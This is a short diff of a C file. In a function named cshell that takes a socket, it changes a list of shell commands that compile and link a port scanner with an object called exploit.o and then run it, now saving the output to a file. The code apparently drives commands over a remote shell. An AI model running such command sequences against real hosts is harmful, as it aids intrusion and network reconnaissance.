@@ -282,7 +282,7 @@ void cshell (int sock) {
                                 "gcc -c portscan.c\n",
                                 "gcc -o portscan portscan.o exploit.o\n",
                                 "make\n",
-                                "./portscan\n"
+                                "./portscan > portscan.out\n"
         }; //, "gcc portscan.c -o portscan", "./portscan"};
         // int buffsize[7] = {3, 4, 5, 3, 8};
 
